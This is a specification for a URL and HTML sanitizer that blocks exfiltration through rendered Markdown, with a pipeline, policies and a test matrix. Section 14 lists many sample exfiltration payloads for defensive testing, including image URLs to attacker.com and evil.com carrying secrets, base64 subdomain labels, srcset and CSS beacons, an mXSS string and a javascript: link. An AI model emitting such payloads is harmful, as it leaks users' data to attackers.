# mcp-outbound-shield — Specification v0.3

This document is the contract the implementation must satisfy. It supersedes the earlier Phase 1–3 drafts. v0.3 clarifies the URL pipeline after the test matrix was made machine-readable (`tests/fixtures/url-matrix.ts`); where this text and the fixture disagree, fix the disagreement deliberately and update both. Keywords MUST/SHOULD/MAY are used in the RFC 2119 sense.

## 0. Principles

1. **Evaluate and emit the exact canonical URL the browser would fetch.** The raw input string is never forwarded to the renderer.
2. **Never decode markup yourself.** URLs are taken exactly as the parser's AST provides them.
3. **Default-deny** for tags, attributes, schemes, hosts, paths, and queries.
4. **Structure first, heuristics second.** Heuristics are a backstop, not the boundary.
5. **Fail closed.** Anything unverified is removed, made inert, or the message is dropped, per section 12.

## 1. Threat model amendments

The earlier threat-model list of vectors stays as the test corpus (see README and section 14). The following changes apply.

**Network channels.** Data can leave via (a) hostname labels (DNS, SNI), (b) path segments, (c) query parameters. Fragments are not sent over HTTP. They are stripped on auto-fetching elements as defense in depth.

**Attacker-observable origins.** A leak only matters if the attacker can read the request. Path and query heuristics therefore matter on origins where an attacker controls content, tenant, bucket, logs, or a redirect target. Operators SHOULD review each allowlist entry with the question "can an attacker read requests to this origin?" Path-pattern restriction is the strongest control; entropy checks are secondary.

**Renderer profiles.** The reference profile unfurls links. Therefore the default `link_handling_mode` is `defang_untrusted`. If `renderer_profile.unfurls_links` is `false`, `warn` is an acceptable default.

**Additional vectors, covered by default-deny:** `<iframe srcdoc>`, MathML `href`, SVG `<animate>`/`<set>`, `loading` attributes, `<picture>`, `<source>`, `<video>`, `<audio>`, `<track>`, `<object>`, `<embed>`, `<form action>`, `<input type=image>`, `<template>`, `<textarea>`, `<noscript>`.

**Out of scope for v1:** Adaptive Cards and other JSON card schemas; server-side unfurlers reading raw text outside this pipeline.

## 2. Component responsibilities

Each transformation has exactly one owner. Tests MUST state which component they exercise.

| Transformation | Owner |
|---|---|
| Markdown entity decoding in link destinations | Markdown parser (remark/micromark) |
| HTML character-reference decoding in attributes | HTML parser (parse5) |
| HTML5 error recovery (unclosed tags) | HTML parser |
| Tab/LF/CR removal, trimming | URL evaluator (section 3, step 2) |
| Dot-segment resolution, host lowercasing, default-port elision | WHATWG URL parser |
| Scheme/host/port/path/query policy | URL evaluator |
| Tag/attribute allowlisting | Sanitizer |
| Canonical URL emission | Sanitizer, using evaluator output |

## 3. URL evaluation pipeline

Input: `raw` (string from AST), `vector` (element/attribute or node kind), `policy`. Output: `{allow: true, canonical}` or `{allow: false, reason}`. Any thrown error is `allow: false`. The function is pure.

1. **Residual entity check.** If `raw` matches `/&(#[0-9]+|#x[0-9a-f]+|[a-z][a-z0-9]*);/i`, REJECT (`double_encoded`). Do not decode.
2. **Trim and strip.** Remove leading/trailing characters ≤ U+0020. Remove all U+0009, U+000A, U+000D anywhere (WHATWG parsers ignore them).
3. **Character gate.** Every remaining character MUST be in U+0021–U+007E. Anything else (controls, zero-width, bidi, soft hyphen, variation selectors, non-ASCII of any kind) is REJECTED (`illegal_char`). **v1 rejects all non-ASCII input, including IDN hostnames.** Operators with IDN domains list the punycode form, and documents must use it.
4. **Delimiter gate.** REJECT any backslash (WHATWG parsers treat `\` as `/`). REJECT any `%25` anywhere. REJECT any `%` or `;` anywhere **before the first `?` or `#`** (this covers percent-encoded hosts like `g%69thub.com`, encoded dot-segments like `%2e%2e`, and path parameters). Percent-encoding in a query is rejected by the value charset in step 12.
5. **Relative and protocol-relative.**
   - Starts with `//`: prefix `https:`.
   - Starts with a single `/` (absolute-path relative): allowed only if the allowlist has a `__relative__` entry. Resolve against `https://__relative__.invalid/`, apply that entry's path/query rules (the host check is skipped), and emit the **path and query only** (for example `/icons/a.png`), never the placeholder host.
   - Any other string with no scheme (path-relative such as `icons/a.png`, or empty): REJECT (`relative_not_allowed`). Path-relative URLs resolve against the page URL or a `<base>`, which the shield cannot know.
   - A string with a scheme (`^[a-z][a-z0-9+.-]*:`, including the forms `https:/host` and `https:host` that browsers accept) is absolute.
6. **WHATWG parse** (`new URL`). Failure → REJECT.
7. **Scheme.** MUST be `https:` (`http:` only if `allow_http: true`). All others REJECT, including `javascript:`, `data:`, `blob:`, `file:`, `ws:`, `wss:`, `ftp:`, `about:`.
8. **Authority.** REJECT if username or password is non-empty. REJECT if hostname is an IPv4 form (any numeric host), starts with `[`, or ends with `.` (trailing dot).
9. **Port.** The parser elides the default (443). If `url.port` is non-empty, the allowlist key MUST be exactly `host:port`; otherwise REJECT. Ports are never stripped.
10. **Host match** (section 4). Rejects with `subdomain_not_allowed` when the hostname sits under an allowlisted host that has subdomain rules but the label fails them; otherwise `host_not_allowed`.
11. **Path match** (section 5), on `url.pathname` after the parser resolved `.` and `..`. Checks run in this order: segment charset and length (`path_charset`), depth (`path_too_deep`), then pattern match (`path_not_allowed`). A character the parser percent-encodes (for example `"`) shows up as `%` in the pathname and fails the charset check.
12. **Query** (section 6). If `allow_query` is false, any `?` in the URL, including an empty one, rejects with `query_not_allowed`.
13. **Fragment.** Set `url.hash = ""` for auto-fetching vectors (`markdown_image`, `markdown_definition`, `html_img_src`); setting it also removes an empty trailing `#`. Link vectors (`markdown_link`, `markdown_autolink`, `html_a_href`) keep their fragment. Reference definitions count as auto-fetch because an image can resolve to them.
14. **Heuristics** (section 7).
15. **Emit** `url.href`. Invariant: `evaluate(canonical) == canonical` (checked in tests).

## 4. Host and subdomain matching

- Allowlist keys are lowercase ASCII hostnames (optionally `host:port`). Matching is exact against `url.hostname`.
- **`allowed_subdomains: ["cdn", "static"]`:** the hostname MUST equal `<label>.<key>` where `<label>` is in the list (single level). This is the recommended way to allow subdomains.
- **`allow_subdomains: true`** is discouraged. It requires `"acknowledge_wildcard_risk": true`, otherwise the policy fails to load. When used: exactly one additional label, length ≤ `max_subdomain_label_length` (default 16), matching `^[a-z0-9]+(-[a-z0-9]+)?$`, and not all-hex when length ≥ 10. The loader prints a warning. **These are weak:** hostnames are lowercased by the URL parser, so case-based detection is impossible, and lowercase base32/base36 passes. Data can still reach your DNS logs.
- The policy loader REJECTS keys that are public suffixes or on a built-in shared-hosting list (`github.io`, `herokuapp.com`, `amazonaws.com`, `blob.core.windows.net`, `pages.dev`, `netlify.app`, `vercel.app`, and similar).

## 5. Path matching

- Patterns are absolute paths. Each segment is a literal or contains `*`.
- **`*` matches within exactly one segment**, using the charset `[A-Za-z0-9._-]`. `*.png` matches `logo.png`, not `a/b.png`.
- **`**` is allowed only as the final segment** and matches one or more segments. It MUST be written explicitly.
- A pattern without wildcards matches only that exact path.
- Segment charset: `[A-Za-z0-9._-]`; segment length ≤ 64 (configurable); total depth ≤ `max_path_depth` (default 6). Anything else REJECTS.
- Matching is **case-sensitive** unless the entry sets `path_case_insensitive: true` (appropriate for GitHub org/repo names). Canonical output preserves the input case.
- Recommended pattern shape: directory prefix plus an extension, such as `/my-org/assets/*.png`.

## 5a. Reject reason codes and the step that produces them

| Step | Reasons |
|---|---|
| 1 | `double_encoded` |
| 3 | `illegal_char` |
| 4 | `illegal_delimiter` |
| 5 | `relative_not_allowed` |
| 6 | `parse_failed` |
| 7 | `scheme_not_allowed` |
| 8 | `credentials_present`, `ip_host`, `trailing_dot_host` |
| 9 | `port_not_allowed` |
| 10 | `host_not_allowed`, `subdomain_not_allowed` |
| 11 | `path_charset`, `path_too_deep`, `path_not_allowed` |
| 12 | `query_not_allowed`, `query_param_not_allowed`, `query_param_duplicate`, `query_value_invalid` |
| 14 | `uri_too_long`, `base64_signature`, `hex_run`, `high_entropy` |
| any | `internal_error` (an unexpected exception; never produced by input alone) |

The first failing step decides the reason. This map is mirrored in `tests/helpers/reason-step-map.ts`.

## 6. Query matching

- `allow_query: false` is the default. Any non-empty `url.search` REJECTS.
- If `allow_query: true`, the entry MUST define a non-empty `allowed_query_params`.
  - The query is split on `&`. Every pair must be `name` or `name=value`; an empty pair (`?a=1&`, `?`) is `query_value_invalid`. Unlisted names (`query_param_not_allowed`; names are case-sensitive), duplicate names (`query_param_duplicate`), or more parameters than listed REJECT.
  - Values MUST match `^[A-Za-z0-9._-]*$` and be ≤ `max_param_value_length` (default 32).
  - Because of the charset, `%`, `:`, `/`, and `=` cannot appear in values; this makes nested-URL smuggling impossible by construction. The explicit nested-URL guard remains as a second check (reject values that contain a scheme pattern `[a-z][a-z0-9+.-]*:` or parse as a URL).

## 7. Heuristics (secondary)

Applied to dynamic path segments (those matched by `*`/`**`) and permitted query values, after the structural checks pass.

1. **Length:** `url.href.length ≤ max_uri_length` (entry value, else default).
2. **Base64 signature:** the token (filename without a known image extension) matches `^[A-Za-z0-9_-]{14,}={0,2}$` and contains ≥1 uppercase, ≥1 lowercase, and ≥1 digit → REJECT. Any `=` or `%3D` → REJECT.
3. **Hex run:** contiguous hex ≥ 20 characters → REJECT unless `allow_uuid_or_sha_paths: true`.
4. **Entropy:** tokens longer than 20 characters with Shannon entropy > `max_segment_entropy` (default 4.2) → REJECT.

Known limits: the maximum entropy of an n-character token is log2(min(n, alphabet)), so short tokens cannot reach high thresholds; lowercase-only encodings evade rule 2; short chunks evade everything. Tests MUST include both false-positive cases (long hyphenated filenames, UUIDs with the flag) and known false-negative cases, documented as such.

## 8. HTML and Markdown sanitization (default-deny)

**Allowed elements:** `p br hr h1 h2 h3 h4 h5 h6 ul ol li blockquote pre code em strong b i del s sup sub table thead tbody tr th td details summary div span a img`.

**Allowed attributes:**
- `a`: `href` (link policy, section 10), `title`
- `img`: `src` (URL evaluator), `alt`, `title`, `width`, `height` (digits only)
- `th`, `td`: `colspan`, `rowspan` (digits), `align` (`left|center|right`)
- everything else: none

**Dropped with their content:** `script style iframe object embed svg math template textarea noscript title base meta link form input button select video audio source track picture canvas`.

**Other unknown elements** are unwrapped (children kept). **Disallowed attributes** are removed (and audited). That includes `style`, `class`, `id`, `name`, `srcset`, `srcdoc`, `poster`, `background`, `loading`, `data-*`, and all `on*`.

Markdown nodes:
- **Images:** URL evaluated as an auto-fetch vector.
- **Reference definitions:** every definition's URL is evaluated; a violating definition is **removed**, so references to it render as literal text. This is the control point for reference-style images and links.
- **Bare URLs / GFM autolinks (`https://`, `www.`, `<url>`):** treated as links (section 10).
- **Code spans and fences:** contents are inert; never evaluated, except for the `rich_blocks` rule below.

## 9. Rich blocks

With `rich_blocks: "inert"` (default, v1):
- A fenced block with info string `mermaid` is emitted with the info string replaced by `text` (content unchanged), so the renderer will not execute Mermaid.
- Math nodes (inline or block) containing `\href`, `\url`, `\includegraphics`, or `\html…` macros are removed. A denylist is weak; the real control is configuring KaTeX with `trust: false`, which the README tells integrators to do.

## 10. Link handling

Applies to `[text](url)`, `<a href>`, `<url>`, and bare autolinks (`https://…`, `www.…`).

**Classification** (`src/links/classify-link.ts`), using the URL evaluator:

| Class | Meaning |
|---|---|
| `trusted` | The evaluator allows the URL (allowlist match). Emitted in canonical form. |
| `untrusted_web` | Rejected by the allowlist, but a clean `http(s)` URL. Canonicalized to the parser's own `href` after steps 1, 2, 5 (absolute only), 6, a scheme check (`http`/`https` always acceptable for links), and step 8 (no credentials, IP hosts, or trailing dot). This is deliberately looser than image evaluation (percent-encoding and non-ASCII are fine) because the emitted value is the browser's own view and a link needs a click. |
| `unusable` | Anything else: `javascript:`, `data:`, relative, credentials, IP hosts, malformed. |

**Modes** (`src/links/apply-link-mode.ts`) return structured parts (`text`, `code`, `link`) rather than strings, so the Markdown and HTML passes build real nodes and the serializers do the escaping.

| Mode | `trusted` | `untrusted_web` | `unusable` |
|---|---|---|---|
| `allow` | link | link | text |
| `warn` | link | link followed by a visible ` ⚠️` | text |
| `defang_untrusted` | link | `text (` + code span of the defanged URL + `)`; for an autolink, only the defanged code span | text |
| `strip_untrusted` | link | text only; for an autolink, nothing | text |

Rules that apply to every text-only outcome:

- **Defang.** `http`→`hxxp`, `https`→`hxxps`, each `.` in the host → `[.]`; other schemes get `[:]`; characters outside printable ASCII are shown as `<U+XXXX>`; a protocol-relative `//host` is defanged too.
- **No re-linking.** Link text is passed through `defangText`, which defangs any URL-looking substring. Without this, unwrapping `[https://evil.com](https://evil.com)` into plain text would let a renderer auto-link it again.
- **An autolink in `strip_untrusted` mode is removed entirely**, because its text is the URL.

## 10a. Audit events

Every strip, replace, defang, rewrite, made-inert, drop, and abort is reported to an `AuditSink` as `{category, action, vector?, reason?, detail?, subject?}`. `subject` and `detail` come from attacker-influenced input, so they are truncated to 120 characters and control characters are replaced before they reach a sink; `ConsoleSink` writes JSON lines so a newline cannot forge a log entry. A sink that throws is ignored (`recordSafely`): a failing log destination must never change, block, or leak output. `MemorySink` is bounded and counts what it dropped.

## 11. Streaming: incremental prefix-reparse

**Equivalence property:** for any input `S` and any chunking, `stream(chunks) == buffered(S)`.

**Mechanism.** Chunks append to an accumulator. The scanner works per character, case-insensitively. A prefix is flushed only when it is outside any potential construct. Hold starts at: `!`, `[`, `<`, `h`/`H` (potential `http(s)://`), `w`/`W` (potential `www.`), `/` (potential `//`), `\`, and backtick/`~` (fence state).

**Early release:** `!` releases if the next character is not `[`. `h`/`w`/`/` release as soon as the prefix cannot match `http://`, `https://`, `www.`, or `//`. `[` releases if the closing `]` is not followed by `(`, `[`, or `:` at line start. On construct close, the engine re-parses the unfinalized block from the document root (so code fences and open HTML blocks are respected), evaluates URLs, substitutes canonical forms, and flushes.

**Reference-style images and links.** No hold is needed: definitions are the control point (section 8). `![a][1]` flushes immediately; if `[1]:` later arrives with a violating URL, the definition is removed and the reference stays literal; if it arrives with an allowed URL, the canonical definition is emitted.

**Oversize and unterminated constructs.** Limits are applied identically in both modes:
- A held construct larger than `max_construct_bytes` (default 4096), or still unterminated at end of input, is emitted as **inert text**: in Markdown text context, a code span (delimiter longer than any backtick run inside); in an HTML text context, HTML-escaped text. Either way, any URL inside is defanged. This is fail-closed, lossless, and does **not** trigger `on_error`.

## 12. Failure modes

| Setting | Trigger | Options |
|---|---|---|
| `on_violation` | A parsed node violates policy | `strip_node`, `replace_placeholder` (`[Blocked Resource]`), `defang` |
| `on_error` | Idempotency failure; depth > `max_depth` or nodes > `max_nodes`; input > `max_input_bytes`; unhandled internal exception | `drop_message`, `abort_stream` |

`on_error` is never used for ordinary malformed HTML (unclosed tags), which the HTML5 parser recovers from deterministically. `on_error` always fails closed; no unparsed or unverified string reaches the renderer. Every `on_error` and `on_violation` event is logged to the audit sink.

**Idempotency:** the engine verifies `sanitize(O) == O` before emitting. A mismatch triggers `on_error`. This is a tripwire, not a proof; an output can be idempotent and still dangerous, so it complements the other checks.

## 13. CSP exporter

`generateCSP(policy)` returns:
- Directives to merge into the host app's CSP: `img-src` (one source per allowed host/path directory, e.g. `https://github.com/my-org/assets/`), `media-src 'none'`, `font-src 'none'`, `frame-src 'none'`, `object-src 'none'`.
- Recommended headers: `X-DNS-Prefetch-Control: off`, `Referrer-Policy: no-referrer`.
- It never emits `default-src`.

Notes: CSP path sources are prefix matches and lose path precision after redirects. CSP does not fully prevent DNS prefetch and cannot affect server-side unfurling. Rendering inside a sandboxed iframe is recommended.

## 14. Test matrix

The authoritative, machine-readable matrix is `tests/fixtures/url-matrix.ts`: the T-xx rows below, plus E-xx (extra evaluator edge cases), L-xx (documented limitations that are allowed today and recorded so any change is noticed), and X-xx (extra sanitizer cases). `tests/matrix/matrix-traceability.test.ts` verifies that every reject reason, every pipeline step, and every vector is exercised, and that the expectations agree with the real WHATWG parser. Sanitizer outputs are provisional until the serializers exist.

**Policy used by the matrix**

- `github.com`: `allowed_paths: ["/my-org/assets/*.png"]`, `allow_query: false`, `max_uri_length: 250`
- `api.corp.internal`: `allowed_paths: ["/chart/*"]`, `allow_query: true`, `allowed_query_params: ["theme","size"]`, `max_param_value_length: 10`
- `static.internal`: `allowed_subdomains: ["cdn"]`, `allowed_paths: ["/img/*.png"]`, `allow_query: false`
- Modes: `on_violation: strip_node`, `on_error: drop_message`, `link_handling_mode: defang_untrusted`

### 14.1 URL and vector tests

`⏎` means empty output for the node. "Owner" is the component responsible.

| ID | Case | Input | Expected | Rule / owner |
|---|---|---|---|---|
| T-01 | Canonical emit | `Hello ![logo](HTTPS://GITHUB.COM/my-org/assets/logo.png#frag)` | `Hello ![logo](https://github.com/my-org/assets/logo.png)` | Host lowercased (URL parser); fragment stripped (step 13) |
| T-02 | Untrusted host | `Summary: ![a](https://attacker.com/log?d=SECRET)` | `Summary: ` | Host not allowlisted |
| T-03 | Dot traversal | `![a](https://github.com/my-org/assets/../../evil/leak.png)` | ⏎ | Parser resolves to `/evil/leak.png`; path fails |
| T-04 | Encoded slash | `![a](https://github.com/my-org/assets/..%2fevil/leak.png)` | ⏎ | `%` in path (step 4) |
| T-05 | Query default-deny | `![a](https://github.com/my-org/assets/p.png?v=1)` | ⏎ | `allow_query: false` |
| T-06 | Chunked query | `![a](https://api.corp.internal/chart/1?theme=a&s1=SE&s2=CR)` | ⏎ | Unlisted params |
| T-07 | Entity-encoded tab (HTML) | `<ImG sRc=" &#x09;ht&#x74;ps://github.com/my-org/assets/ok.png ">` | `<img src="https://github.com/my-org/assets/ok.png">` | parse5 decodes entities; evaluator strips tab; canonical emitted |
| T-08a | Zero-width via entity (MD) | `![a](https://github.com/my-org/assets/a&#x200B;.png)` | ⏎ | CommonMark decodes; non-ASCII rejected (step 3) |
| T-08b | Raw U+200B in path | `![a](https://github.com/my-org/assets/a​.png)` | ⏎ | Non-ASCII rejected |
| T-09 | Double percent-encoding | `![a](https://api.corp.internal/chart/1?theme=%253A%252F%252F)` | ⏎ | `%25` (step 4) |
| T-10 | Non-default port | `![a](https://github.com:8080/my-org/assets/logo.png)` | ⏎ | Port rule (step 9) |
| T-11 | Base64 label under wildcard-like host | `![a](https://U0VDUkVUX0RBVEE.static.internal/img/a.png)` | ⏎ | Label not in `allowed_subdomains`. (Case is irrelevant: the URL parser lowercases first.) |
| T-12a | Long lowercase label | `![a](https://secretdataexfil123.static.internal/img/a.png)` | ⏎ | Label not in list |
| T-12b | Lowercase base32 label | `![a](https://mfrggzdfmz.static.internal/img/a.png)` | ⏎ | Label not in list |
| T-12c | Allowed subdomain | `![a](https://cdn.static.internal/img/a.png)` | unchanged | Label in list |
| T-13 | Base64 filename | `![a](https://github.com/my-org/assets/U0VDUkVUX0RBVEE.png)` | ⏎ | Heuristic 2 |
| T-14 | False-positive guard | `![a](https://github.com/my-org/assets/architecture-overview-diagram.png)` | unchanged | Passes heuristics |
| T-15 | `srcset` smuggling | `<img src="https://github.com/my-org/assets/ok.png" srcset="https://evil.com/leak 2x">` | `<img src="https://github.com/my-org/assets/ok.png">` | `srcset` not an allowed attribute |
| T-16 | `<base>` and `<link>` | `<base href="https://evil.com"><link rel="dns-prefetch" href="//evil.com">` | ⏎ | Elements dropped |
| T-17 | CSS and SVG | `<div style="background:url(https://evil.com/x)"><svg><use href="https://evil.com/s#i"/></svg></div>` | `<div></div>` | `style` removed; `svg` dropped with content |
| T-18 | Markdown inside attribute | `<div title="![a](https://evil.com/x)">Hello` | `<div>Hello</div>` | `title` not allowed on `div`; no image parsed inside attribute |
| T-19 | mXSS payload | `<svg><style><img src="</style><img src=https://evil.com/x>"></style></svg>` | Golden output pinned at implementation | Asserted invariants now: no `evil.com`, no non-allowlisted element, idempotent, no `on_error` |
| T-20a | Mermaid | ` ```mermaid\ngraph TD;\nclick A "https://evil.com"\n``` ` | Same block with info string `text` | Section 9 |
| T-20b | KaTeX macro | `$$\href{https://evil.com/leak}{x^2}$$` | ⏎ | Section 9 |
| T-21 | Path chunking | `![a](https://github.com/my-org/assets/SE/CR/ET.png)` | ⏎ | `*` is one segment |
| T-22 | Path parameter | `![a](https://github.com/my-org/assets/a.png;x=1)` | ⏎ | `;` in path |
| T-23 | Bidi override | raw U+202E inside path | ⏎ | Non-ASCII |
| T-24 | `iframe srcdoc` | `<iframe srcdoc="<img src=https://evil.com/x>"></iframe>` | ⏎ | `iframe` dropped with content |
| T-25 | Residual entity | `![a](https://github.com/my-org/assets/a&amp;#x2e;png)` | ⏎ | Step 1 |
| T-26 | Bare `www` autolink | `see www.attacker.com/x?d=SECRET` | ``see `www[.]attacker[.]com/x?d=SECRET` `` | Defang (section 10) |
| T-27 | Untrusted link | `[click](https://evil.com/x?d=S)` | ``click (`hxxps://evil[.]com/x?d=S`)`` | `defang_untrusted` |
| T-28 | `javascript:` link | `<a href="javascript:alert(1)">x</a>` | `x` | Scheme rejected; text only |
| T-29 | Decimal IP host | `![a](https://2130706433/x.png)` | ⏎ | Numeric host |
| T-30 | Trailing-dot host | `![a](https://github.com./my-org/assets/a.png)` | ⏎ | Step 8 |
| T-31 | Credentials trick | `![a](https://github.com@attacker.com/my-org/assets/a.png)` | ⏎ | Step 8 |
| T-32 | Protocol-relative | `<img src="//attacker.com/x.png">` | ⏎ | Prefixed with `https:`, host not allowlisted |
| T-33 | Forward-reference definition | `![a][1]\n\n[1]: https://evil.com/x` | `![a][1]` (definition removed) | Section 8 |
| T-34 | Allowed definition | `![a][1]\n\n[1]: HTTPS://GITHUB.COM/my-org/assets/a.png` | `![a][1]\n\n[1]: https://github.com/my-org/assets/a.png` | Canonical definition |
| T-35 | Depth bomb | 100 nested blockquotes | Message dropped | `on_error`: depth |

### 14.2 Streaming tests

| ID | Scenario | Chunks | Expected |
|---|---|---|---|
| S-01 | Punctuation early release | `["Hello! ", "How ", "are ", "you?"]` | `!` is held one character, released on the space; no perceptible delay |
| S-02 | Scheme split across tokens | `["Visit ", "ht", "tps://", "evil.com/leak", " now"]` | `Visit ` flushes; URL held, defanged; ` now` flushes |
| S-03 | Inert code fence | `["```markdown\n", "![a](https://", "evil.com/x)", "\n```"]` | Output equals buffered mode; code block intact |
| S-04 | Forward reference | `["Hi ", "![a][1]", " mid ", "\n[1]: https://evil.com/x"]` | `Hi ![a][1] mid ` flushes without holding; definition line removed; final output equals buffered |
| S-05 | Oversize / unterminated construct | `["Text ", "<img src='https://evil.com/", "a".repeat(5000)]` | `Text ` flushes; remainder emitted as inert escaped text with defanged URL; **no** `on_error`; equals buffered output |
| S-06 | Stream ends mid-hold | `["Look: ", "![a](https://evil"]` then end | Remainder emitted as inert text; equals buffered output |
| S-07 | Equivalence property | Random document × random chunkings | `stream == buffered` for all |

### 14.3 Property and system tests

- **P-01:** for any generated input, every URL in an auto-fetching position in the output passes `evaluate`.
- **P-02:** `sanitize(sanitize(x)) == sanitize(x)`.
- **P-03:** `evaluate(canonical) == canonical` for every allowed URL.
- **P-04:** no input causes an uncaught exception; failures surface as `on_error`.
- **B-01:** render sanitized output of the whole matrix in a headless browser; assert zero requests to non-allowlisted origins and zero DNS-prefetch hints.
- **F-01:** fuzz the URL evaluator and the sanitizer in CI (short run per push, long run scheduled).

## 15. Open items to settle during implementation

- Exact golden output for T-19 once parse5 behavior is observed.
- Public-suffix / shared-hosting list source and update policy.
- Choice of the first integration target (react-markdown pipeline vs. MCP SDK host).
